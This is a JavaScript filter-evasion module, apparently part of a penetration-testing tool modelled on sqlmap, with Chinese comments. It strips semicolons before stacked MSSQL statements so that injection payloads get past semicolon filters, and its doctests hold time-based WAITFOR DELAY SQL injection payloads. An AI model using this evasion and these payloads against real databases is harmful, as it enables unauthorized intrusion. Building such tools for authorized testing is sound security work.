// 对标 sqlmap mssqlnosemicolon.py：MSSQL 语句分号可省略
// ;WAITFOR -> ' WAITFOR'（堆叠注入去分号，绕过分号过滤）
// [2026-10-12 性能] 正则模块级预编译（原每次 transform 都 new RegExp；零行为变化，
// 论证见 keyword2hex.js 同批注释）
const KEYWORDS = 'WAITFOR|DECLARE|SET|EXEC(?:UTE)?|SELECT|INSERT|UPDATE|DELETE|CREATE|DROP|ALTER|TRUNCATE|BEGIN|IF|WHILE|PRINT|USE|GRANT|REVOKE|BACKUP|RESTORE|RECONFIGURE|SHUTDOWN|WITH';
const RE = new RegExp(`;(?=\\s*(?:${KEYWORDS})\\b)`, 'gi');

export const mssqlnosemicolon = {
  name: 'mssqlnosemicolon',
  description: '将 MSSQL 堆叠语句前的分号替换为空格（;WAITFOR → WAITFOR，绕过分号过滤）',
  doctests: [
    { input: ";WAITFOR DELAY '0:0:5'--", output: " WAITFOR DELAY '0:0:5'--" },
    { input: ';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x', output: ' DECLARE @x CHAR(9) SET @x=0x303a303a35 WAITFOR DELAY @x' },
    { input: "1' AND 'a'='a", output: "1' AND 'a'='a" }, // 无分号不动
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return String(payload ?? '').replace(RE, ' ');
  },
};
export default mssqlnosemicolon;
